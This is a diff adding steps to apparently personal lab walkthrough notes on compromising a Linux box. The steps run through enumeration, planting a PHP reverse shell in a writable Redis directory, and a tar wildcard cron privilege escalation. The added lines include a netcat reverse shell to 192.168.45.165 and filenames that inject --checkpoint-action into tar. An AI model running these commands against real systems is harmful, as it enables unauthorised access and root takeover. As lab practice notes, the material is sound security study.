@@ -23,7 +23,17 @@
 ![image](https://github.com/user-attachments/assets/3da3ccb4-d310-4ec0-997a-e36f382c4269)
 ![image](https://github.com/user-attachments/assets/f9aa57d6-6449-46a2-b1e5-965417cc7447)
 ![image](https://github.com/user-attachments/assets/dc98b19b-3e84-43c5-bbd9-b98694de687e)
-![image](https://github.com/user-attachments/assets/ed730cda-6241-4b1b-bb85-a915be7ef52d)
+![image](https://github.com/user-attachments/assets/0d8cb718-3c8e-4d38-ba97-57811711372a)
+![image](https://github.com/user-attachments/assets/1cef9b58-474c-4bd0-977d-abd8c2d355b1)
+![image](https://github.com/user-attachments/assets/ca76b36b-5339-44b5-8937-c5ef35d597f6)
+![image](https://github.com/user-attachments/assets/c78831d0-3da7-4447-abc1-caa9a44f1b18)
+![image](https://github.com/user-attachments/assets/fecc6a50-c773-4e95-a088-e9d41d34c5e0)
+![image](https://github.com/user-attachments/assets/9a0854be-5d8b-420b-9ede-94872d72e817)
+
+![image](https://github.com/user-attachments/assets/6d4ef98c-0832-49ac-9a74-4062f54a219d)
+
+![image](https://github.com/user-attachments/assets/c87489ac-ac30-40e7-94b5-6a0ca0182233)
+
 
 
 
@@ -43,4 +53,25 @@
 
 8. netstat -tulnp --> port 3306 listen on local address
 
-9. 
+9. try MySQL database --> cannot log in, just hanging
+
+10. ps -aux --> alice run apache2
+
+11. find / -type d -maxdepth 4 -writable 2>/dev/null --> cannot write to /var/www/html (apache2)
+
+12. simple php --> /tmp/test.php ---> curl to call  --> fail
+
+13. simple php --> /run/redis/test.php ---> curl to call --> work
+
+14. php reverse shell --> /run/redis/php-reverse-shell.php --> curl to call --> get shell as alice
+
+15. linpeas --> Cron Job /usr/local/bin/backup.sh --> tar *
+
+16. tar wildcard privilege escalation
+    ```bash
+    echo '#!/bin/bash' > exploit.sh
+    echo 'nc -e /bin/sh 192.168.45.165 80' >> exploit.sh
+    chmod +x exploit.sh
+    touch ./"--checkpoint=1"
+    touch ./"checkpoint-action=exec=bash exploit.sh"
+   ```
